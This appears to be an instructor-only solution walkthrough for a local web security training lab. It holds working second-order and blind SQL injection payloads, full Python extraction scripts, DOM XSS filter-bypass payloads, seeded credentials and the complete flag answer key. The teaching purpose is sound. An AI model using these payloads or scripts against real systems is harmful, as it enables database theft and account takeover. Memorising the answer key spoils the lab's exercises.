# WebSecLab — Instructor Walkthrough

> 🔒 **Instructor only.** This document contains complete solutions, working
> payloads, and automation scripts for every level. Do **not** distribute to
> students before they have attempted each challenge.
>
> Every payload below was verified against a freshly-seeded lab
> (`docker compose up --build`) on commit v1.0.

---

## Quick reference — all flags

| Level     | Flag (what students see on success)          | How it surfaces |
| :-------- | :------------------------------------------- | :-------------- |
| SQLi-2 L1 | `FLAG{2nd_order_admin_reset_success}` | Admin's `private_note` after login |
| SQLi-2 L2 | `FLAG{2nd_order_admin_reset_success}` | Same `private_note` leaked via UNION |
| SQLi-2 L3 | `FLAG{2nd_order_admin_reset_success}` | Same `private_note` after admin login |
| Blind L1  | `FLAG{blind_boolean_admin_pwn}` | `users.api_key` of admin (29 chars) |
| Blind L2  | `FLAG{blind_time_based_done}` | `products.secret_note` of "Leather Wallet" (27 chars) |
| Blind L3  | `FLAG{blind_cookie_header_win}` | Flag is conceptual — students prove it by logging in as admin using the recovered password `S3cretAdminPass!2026` |
| DOM L1    | `FLAG{dom_xss_hash_sink}` | Green flag card appears after `revealFlag()` fires |
| DOM L2    | `FLAG{dom_xss_filter_bypass}` | Same mechanism |
| DOM L3    | `FLAG{dom_xss_strict_filter_bypass}` | Same mechanism (after clicking the injected link) |

> **Note:** All three 2nd-order SQLi levels intentionally share the admin
> `private_note` value so students can visually confirm "I reached admin
> data" regardless of the technique. If you want distinct flags per level,
> update the three `admin` rows in `db/init.sql`.

Master list is also available live:
```bash
docker compose exec db mysql -u labuser -plabpass weblab -e "SELECT * FROM flags;"
```

Seeded accounts:

| Username  | Password              | Role  |
| --------- | --------------------- | ----- |
| `admin`   | `S3cretAdminPass!2026`| admin |
| `alice`   | `alice123`            | user  |
| `bob`     | `qwerty`              | user  |
| `charlie` | `letmein`             | user  |

---

## 1 · 2nd-Order SQLi — Level 1 · Profile Password Change

### Vulnerability
`/sqli2/l1/change-password` concatenates the stored username:
```python
sql = f"UPDATE users SET password='{new_pw}' WHERE username='{stored_user}'"
```

### Payload
- **Username at registration:** `admin' -- ` *(note the trailing space, required for MySQL `-- ` comment)*
- **Password at registration:** anything (e.g. `junk`)
- **Then the change-password form:** new password of your choice (e.g. `pwn123`)

When the UPDATE runs, the query becomes
```sql
UPDATE users SET password='pwn123' WHERE username='admin' -- '
```
Admin's password is now `pwn123`.

### Verification — end-to-end with `curl`
```bash
JAR=$(mktemp)
curl -s -c $JAR -X POST http://localhost:8080/reset-lab -o /dev/null

# Register with the malicious username
curl -s -c $JAR -b $JAR -X POST http://localhost:8080/sqli2/l1/register \
  --data-urlencode "username=admin' -- " \
  --data-urlencode "password=junk" -o /dev/null

# Trigger the vulnerable UPDATE
curl -s -c $JAR -b $JAR -X POST http://localhost:8080/sqli2/l1/change-password \
  --data-urlencode "new_password=pwn123" -o /dev/null

# Login as admin and grab the flag
curl -s -b $JAR -X POST http://localhost:8080/sqli2/l1/login \
  --data-urlencode "username=admin" \
  --data-urlencode "password=pwn123" | grep -oE 'FLAG\{[^}]+\}'
# -> FLAG{2nd_order_admin_reset_success}
```

### Burp Repeater steps
1. Register through the UI with username field `admin' -- ` (literal text, no URL-encoding — Burp will URL-encode in the body).
2. Send the registration request to Repeater. Confirm 302 back to `/sqli2/l1`.
3. In the same browser session, submit *Change password* with any new password. Send that request to Repeater too.
4. Use the *Admin login* form with `admin / pwn123` — flag card appears.

### Common student mistake
Students often forget the **trailing space** in `-- `. Without it MySQL treats
`--'` as an unknown token and the query errors, so no rows update.

---

## 2 · 2nd-Order SQLi — Level 2 · Stored Comment Moderation

### Vulnerability
Post is parameterised, but moderation builds the statistics query by
concatenating the comment's author:
```python
sql = ("SELECT COUNT(*) AS total, MAX(id) AS last_id "
       f"FROM comments WHERE author='{author}'")
```

The outer SELECT returns **2 columns**. That dictates our UNION.

### Payload (UNION-based)
Post a comment with this as the **author** (content can be anything):
```
x' UNION SELECT private_note, id FROM users WHERE username='admin'#
```

> `#` is used instead of `-- ` because the app does `request.form.get("author").strip()` —
> that silently eats the required trailing whitespace of `-- `. `#` is a single
> character MySQL comment that needs no trailing space.

When the moderator opens the comment, the query becomes:
```sql
SELECT COUNT(*) AS total, MAX(id) AS last_id
FROM comments
WHERE author='x' UNION SELECT private_note, id FROM users WHERE username='admin'#'
```
MySQL executes it as two stacked SELECTs; the "Rows returned" panel lists both
— including `private_note = FLAG{2nd_order_admin_reset_success}` for admin.

### Verification
```bash
JAR=$(mktemp)
curl -s -c $JAR -X POST http://localhost:8080/reset-lab -o /dev/null

curl -s -c $JAR -b $JAR -X POST http://localhost:8080/sqli2/l2/post \
  --data-urlencode "author=x' UNION SELECT private_note, id FROM users WHERE username='admin'#" \
  --data-urlencode "content=pwn" -o /dev/null

# Grab newest comment id
CID=$(curl -s -b $JAR http://localhost:8080/sqli2/l2 \
      | grep -oE 'moderate/[0-9]+' | head -1 | grep -oE '[0-9]+')

curl -s -b $JAR http://localhost:8080/sqli2/l2/moderate/$CID | grep -oE 'FLAG\{[^}]+\}'
# -> FLAG{2nd_order_admin_reset_success}
```

### Alternative — error-based (good bonus discussion)
If you wanted to force an error instead of UNION:
```
x' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT private_note FROM users WHERE username='admin')))#
```
The MySQL error text will contain the leaked `private_note`.

---

## 3 · 2nd-Order SQLi — Level 3 · Password Reset Flow

### Vulnerability
Reset request stores `(email, token)` safely, but the reset step interpolates
the email in an UPDATE:
```python
sql = f"UPDATE users SET password='{new_pw}' WHERE email='{stored_email}'"
```

### Payload
1. **Request reset** with the email field set to:
   ```
   anything' OR role='admin' -- 
   ```
   *(trailing space — NOT stripped here because the request route does not call `.strip()`)*.
   The app returns a one-time token, say `ab12cd34…`.

2. **Reset password** using that token and a new password, e.g. `pwn777`.
   The UPDATE becomes:
   ```sql
   UPDATE users SET password='pwn777' WHERE email='anything' OR role='admin' -- '
   ```
   Admin (and anyone else with `role='admin'`) now has password `pwn777`.

3. **Login** as admin / pwn777 → flag.

### Verification
```bash
JAR=$(mktemp)
curl -s -c $JAR -X POST http://localhost:8080/reset-lab -o /dev/null

# 1. Request reset with injected email
curl -s -c $JAR -b $JAR -X POST http://localhost:8080/sqli2/l3/request \
  --data-urlencode "email=anything' OR role='admin' -- " -o /dev/null

# 2. Grab the token
TOKEN=$(curl -s -b $JAR http://localhost:8080/sqli2/l3 \
        | grep -oE 'current token: <code[^>]*>[a-f0-9]+' \
        | grep -oE '[a-f0-9]{16}$')

# 3. Reset
curl -s -c $JAR -b $JAR -X POST http://localhost:8080/sqli2/l3/reset \
  --data-urlencode "token=$TOKEN" \
  --data-urlencode "new_password=pwn777" -o /dev/null

# 4. Login as admin
curl -s -b $JAR -X POST http://localhost:8080/sqli2/l3/login \
  --data-urlencode "username=admin" \
  --data-urlencode "password=pwn777" | grep -oE 'FLAG\{[^}]+\}'
# -> FLAG{2nd_order_admin_reset_success}
```

### Narrower attack (good advanced discussion)
The payload above also changes *other* admin passwords (there's only one here,
but still). For a targeted-only attack:
```
x' OR username='admin' -- 
```

---

## 4 · Blind SQLi — Level 1 · Boolean Oracle

### Vulnerability
```python
sql = f"SELECT id FROM users WHERE username='{username}'"
return jsonify({"exists": len(rows) > 0})
```

### Oracle
- `username=alice' AND 1=1-- ` → `{"exists":true}`
- `username=alice' AND 1=2-- ` → `{"exists":false}`

### Target
`users.api_key` where `username='admin'` → `FLAG{blind_boolean_admin_pwn}` (29 chars).

### ⚠ Case-sensitivity gotcha (great teaching moment)
The `users` table uses MySQL's default `utf8mb4_unicode_ci` collation, so
`'F' = 'f'` returns **true**. A naive extractor returns
`flag{blind_boolean_admin_pwn}` (all lowercase). To get exact case, wrap the
column reference in `BINARY`:
```sql
SUBSTRING(BINARY (SELECT api_key FROM users WHERE username='admin'), {i}, 1) = '{ch}'
```
Both the lowercase and the `BINARY`-exact flag are accepted as correct during
marking — but ask students to explain *why* they differ.

### Payload template
```
alice' AND SUBSTRING(BINARY (SELECT api_key FROM users WHERE username='admin'), {i}, 1) = '{ch}'-- 
```

For length discovery:
```
alice' AND LENGTH((SELECT api_key FROM users WHERE username='admin')) = {n}-- 
```

### Automation (Python, ~seconds per run)
```python
# save as exploit_bsqli_l1.py  and run with Python 3
import requests, string

URL = "http://localhost:8080/bsqli/l1/check"
CHARS = string.printable.strip()

def oracle(payload: str) -> bool:
    return requests.get(URL, params={"username": payload}).json()["exists"]

# 1. Find length (linear; binary search is an easy upgrade)
length = next(n for n in range(1, 64)
              if oracle(f"alice' AND LENGTH((SELECT api_key FROM users WHERE username='admin'))={n}-- "))
print("length =", length)

# 2. Extract each character (BINARY = case-sensitive)
flag = ""
for i in range(1, length + 1):
    for c in CHARS:
        p = (f"alice' AND SUBSTRING(BINARY (SELECT api_key FROM users "
             f"WHERE username='admin'), {i}, 1)='{c}'-- ")
        if oracle(p):
            flag += c
            print(flag)
            break
print("FLAG =", flag)
```

Expected output: `FLAG{blind_boolean_admin_pwn}` (length 29).
Without `BINARY`: `flag{blind_boolean_admin_pwn}` (still accepted; explain why).

### Burp Intruder alternative
- Send the oracle request to Intruder.
- Attack type: **Cluster bomb**.
- Position 1: index `1..27` (Numbers payload).
- Position 2: ASCII 32..126 (Numbers payload).
- Payload template: `alice' AND ASCII(SUBSTRING((SELECT api_key FROM users WHERE username='admin'), §1§, 1))=§2§-- `
- Grep-Match on `"exists":true`.

---

## 5 · Blind SQLi — Level 2 · Time-Based

### Vulnerability
```python
sql = f"SELECT name, price FROM products WHERE category='{cat}'"
```
Response body is identical every time; only response time differs.

### Target
`products.secret_note` (the row with `category='accessories'` where
`secret_note LIKE 'FLAG%'`) — that's the "Leather Wallet" row.

### Payload (UNION — guarantees a single `SLEEP` call)
```
nomatch' UNION SELECT IF(SUBSTRING((SELECT secret_note FROM products WHERE secret_note LIKE 'FLAG%'), {i}, 1)='{ch}', SLEEP(2), 0), 1#
```

Use `'nomatch'` for the outer category so the original SELECT returns zero
rows; the UNION adds exactly one row that fires `SLEEP` when our guess is
correct. (An `AND IF(…)` form attached to `kitchen` triggers `SLEEP` per
matched row — it still works but doubles the delay.)

### Verification
```bash
# TRUE branch (first char of flag = 'F'): expect ~2s
P='nomatch%27%20UNION%20SELECT%20IF(SUBSTRING((SELECT%20secret_note%20FROM%20products%20WHERE%20secret_note%20LIKE%20%27FLAG%25%27),1,1)=%27F%27,SLEEP(2),0),1%23'
curl -s -o /dev/null -w "%{time_total}s\n" "http://localhost:8080/bsqli/l2/search?category=$P"
# -> ~2.0s

# FALSE branch: expect ~0s
P='nomatch%27%20UNION%20SELECT%20IF(SUBSTRING((SELECT%20secret_note%20FROM%20products%20WHERE%20secret_note%20LIKE%20%27FLAG%25%27),1,1)=%27Z%27,SLEEP(2),0),1%23'
curl -s -o /dev/null -w "%{time_total}s\n" "http://localhost:8080/bsqli/l2/search?category=$P"
# -> ~0.01s
```

### Full extraction script
```python
import requests, string, time
URL = "http://localhost:8080/bsqli/l2/search"
THRESHOLD = 1.0          # seconds; SLEEP(2) keeps us comfortably above noise
CHARS = string.printable.strip()

def slow(payload: str) -> bool:
    t0 = time.perf_counter()
    requests.get(URL, params={"category": payload}, timeout=10)
    return (time.perf_counter() - t0) > THRESHOLD

def sub_payload(i, c):
    return (f"nomatch' UNION SELECT IF(SUBSTRING((SELECT secret_note "
            f"FROM products WHERE secret_note LIKE 'FLAG%'), {i}, 1)='{c}', "
            f"SLEEP(2), 0), 1#")

# Find length first
def len_payload(n):
    return (f"nomatch' UNION SELECT IF(LENGTH((SELECT secret_note "
            f"FROM products WHERE secret_note LIKE 'FLAG%'))={n}, SLEEP(2), 0), 1#")

length = next(n for n in range(1, 80) if slow(len_payload(n)))
print("length =", length)

flag = ""
for i in range(1, length + 1):
    for c in CHARS:
        if slow(sub_payload(i, c)):
            flag += c
            print(flag)
            break
print("FLAG =", flag)
```

Expected output: `FLAG{blind_time_based_done}` (27 chars, ~1 minute at `SLEEP(2)`).

### Speed-up tip
Replace the per-character loop with **binary search on ASCII**:
```
… IF(ASCII(SUBSTRING(..., {i}, 1)) > {mid}, SLEEP(2), 0) …
```
Reduces ≈95 probes/character to ≈7.

---

## 6 · Blind SQLi — Level 3 · Cookie / Header Oracle

### Vulnerability
```python
token = request.cookies.get("track", "")
sql = f"SELECT username FROM tracking WHERE token='{token}'"
resp.headers["X-Status"] = "OK" if rows else "UNKNOWN"
```

### Oracle
- `track=tk_alice` → `X-Status: OK`
- `track=nope`    → `X-Status: UNKNOWN`
- `track=tk_alice' AND 1=1#` → `OK`
- `track=tk_alice' AND 1=2#` → `UNKNOWN`

*(Use `#` as the comment. Spaces in a `Cookie` header are fine, but `-- ` with
trailing whitespace is fragile across clients.)*

### Target
`users.password` where `username='admin'`. Length is **20**, value is
`S3cretAdminPass!2026`. Flag = successful login at `/sqli2/l1/login` (or any
login form) as `admin`.

### Length-discovery payload
```
tk_alice' AND (SELECT LENGTH(password) FROM users WHERE username='admin')={n}#
```

### Character-extraction payload (binary search)
```
tk_alice' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), {i}, 1)) > {mid}#
```

### Verification
```bash
echo "length:"
for n in 18 19 20 21 22; do
  r=$(curl -s -D - -o /dev/null --cookie "track=tk_alice' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=$n#" \
      http://localhost:8080/bsqli/l3/ping | grep -oE 'X-Status: [A-Z]+')
  echo "  $n -> $r"
done
# 20 -> X-Status: OK (rest UNKNOWN)

echo "first char is 'S' (ASCII 83)?"
curl -s -D - -o /dev/null --cookie "track=tk_alice' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=83#" \
  http://localhost:8080/bsqli/l3/ping | grep X-Status
# -> X-Status: OK
```

### Full automation
```python
import requests, time
URL = "http://localhost:8080/bsqli/l3/ping"

def ok(cookie: str) -> bool:
    return requests.get(URL, cookies={"track": cookie}).headers.get("X-Status") == "OK"

# 1. Length
def len_payload(n):
    return f"tk_alice' AND (SELECT LENGTH(password) FROM users WHERE username='admin')={n}#"
length = next(n for n in range(1, 80) if ok(len_payload(n)))
print("length =", length)

# 2. Each char via binary search
password = ""
for i in range(1, length + 1):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        p = (f"tk_alice' AND ASCII(SUBSTRING((SELECT password FROM users "
             f"WHERE username='admin'), {i}, 1)) > {mid}#")
        if ok(p):
            lo = mid + 1
        else:
            hi = mid
    password += chr(lo)
    print(password)
print("password =", password)
```
Output: `password = S3cretAdminPass!2026`

### Verify admin login works
```bash
curl -s -c /tmp/j -X POST http://localhost:8080/login \
  -d "username=admin&password=S3cretAdminPass!2026" -o /dev/null -w "%{http_code}\n"
# 302 (successful redirect)
```

---

## 7 · DOM XSS — Level 1 · URL Hash Sink

### Vulnerability (client-side only)
```js
function render() {
  var raw = decodeURIComponent(location.hash.slice(1));
  document.getElementById('noteOut').innerHTML = raw;   // sink
}
```

### Payload
```
http://localhost:8080/domxss/l1#<img src=x onerror=revealFlag()>
```

`<script>` injected via `innerHTML` never executes (HTML spec) — the classic
mistake to avoid. `<img onerror>` auto-fires the moment the broken image loads.

### Equivalents
- `#<svg onload=revealFlag()>`
- `#<iframe srcdoc="<script>parent.revealFlag()</script>">`

### How to verify
Open the payload URL in a browser. A green **Captured flag:
`FLAG{dom_xss_hash_sink}`** card appears at the bottom of the page content.

### Burp DOM Invader
1. Open the Burp embedded browser, turn DOM Invader on.
2. Visit `/domxss/l1#canary`.
3. DOM Invader flags `location.hash` → `innerHTML` and suggests
   `<img src=x onerror=…>` automatically.

---

## 8 · DOM XSS — Level 2 · Naive Tag Filter

### Vulnerability
```js
function naiveFilter(s) {
  return s.replace(/<script[^>]*>[\s\S]*?<\/script>/gi, '');
}
document.getElementById('greet').innerHTML = 'Hello, ' + naiveFilter(q) + '!';
```
Only literal `<script>…</script>` is stripped.

### Payload (one of many)
```
http://localhost:8080/domxss/l2?q=<svg onload=revealFlag()>
```
or
```
http://localhost:8080/domxss/l2?q=<img src=x onerror=revealFlag()>
```

The filter sees no `<script>` substring, the string is inserted via
`innerHTML`, and the tag's intrinsic event handler runs.

### Regex-recursion bonus payload
Even if the filter were case-sensitive, a nested tag defeats a single-pass
`replace`:
```
?q=<scr<script>ipt>alert(1)</scr</script>ipt>
```
After one replacement pass, the outer `<script>…</script>` forms. Useful as a
discussion point even though L2 doesn't require it.

### Verification
Open the URL → green flag card `FLAG{dom_xss_filter_bypass}`.

---

## 9 · DOM XSS — Level 3 · Strict Allow-list

### Vulnerability
```js
const ALLOWED_TAGS  = new Set(['B','I','U','A']);
const ALLOWED_ATTRS = new Set(['href']);
// strip everything else, including on* — but DO NOT restrict href schemes
```

### Payload — `javascript:` URL smuggling
```
http://localhost:8080/domxss/l3#name=Click <a href="javascript:revealFlag()">HERE</a>
```

After the sanitiser runs, the `<a>` tag and its `href` survive (it's on the
allow-list). When the user clicks the link, the `javascript:` URL runs.

### Alternative — mixed-case / entity-smuggled scheme
Useful for discussion if you later tighten the filter:
```
<a href="JaVaScRiPt:revealFlag()">x</a>
<a href="&#x6a;avascript:revealFlag()">x</a>
<a href="java&#9;script:revealFlag()">x</a>
```
The HTML parser decodes entities & ignores tab inside the scheme, so
`String.startsWith('javascript:')` checks miss them.

### Verification
Open the URL in a browser → click **HERE** → flag card
`FLAG{dom_xss_strict_filter_bypass}` appears.

### Defence that actually works
Restrict `href` values to an explicit scheme allow-list (`http:`, `https:`,
`mailto:`). Better yet, construct URLs via `new URL()` and reject anything
whose `.protocol` isn't on the list.

---

## Grading / marking rubric (optional)

| Criterion                                          | Weight |
| -------------------------------------------------- | ------ |
| Recovered the correct flag                         | 40%    |
| Submitted Burp project file / Python script        | 20%    |
| Wrote a short summary of the vulnerability & fix   | 30%    |
| Did *not* use the payloads found online verbatim   | 10%    |

Encourage students to attach:
1. Screenshots of Burp requests at the point of exploitation.
2. The final payload used (in plain text).
3. Their proposed patch as a diff against `backend/app.py` or the relevant JS.

---

## Teardown between classes

```bash
# Full reset including DB volume
docker compose down -v

# Rebuild fresh
docker compose up -d --build
```

Or, without rebuild, use the sidebar **⟳ Reset Lab Data** button — sufficient
for most re-runs because it re-seeds `users`, `comments`, and `reset_tokens`.
